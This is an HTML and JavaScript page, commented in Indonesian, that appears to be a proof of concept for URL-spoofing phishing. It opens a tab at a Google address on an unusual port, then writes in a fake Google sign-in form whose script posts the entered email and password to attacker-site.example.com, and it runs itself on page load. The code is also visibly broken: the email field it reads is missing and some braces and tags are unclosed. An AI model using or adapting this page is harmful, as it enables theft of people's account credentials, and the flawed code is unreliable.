<html>
  <body>
    <button onclick="spoof()">Click to spoofff</button>

    <script>
      function spoof() {
        // 1. Buka tab baru ke domain target (akan kelihatan seperti google.com:1234)
        let win = window.open("https://www.google.com:1234", "_blank");

        // 2. Tunggu 3 detik lalu ganti isi halaman dengan form palsu
        setTimeout(() => {
          const fakeLogin = `
            <div style="font-family:Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;">
              <h3 style="margin-bottom:10px;">Sign in with your Google Account</h3>

              <input id="pass" type="password" placeholder="Password" style="margin:5px;padding:10px;width:250px;" />
              <button onclick="sendCreds()" style="margin-top:15px;padding:10px 20px;">Sign In</button>
            </div>
            <script>
              function sendCreds() {
                let email = document.getElementById('email').value;
                let pass = document.getElementById('pass').value;
                fetch('https://attacker-site.example.com/log', {
                  method: 'POST',
                  headers: {'Content-Type': 'application/json'},
                  body: JSON.stringify({ email, pass })
                });
                alert("Logging in...");

            </script>
          `;

          // Ganti isi window yang baru dibuka dengan HTML palsu
          win.document.write(fakeLogin);
        }, 3000);
      }

      // Auto-run saat halaman dibuka (jika ingin otomatis, tidak perlu klik tombol)
      spoof();
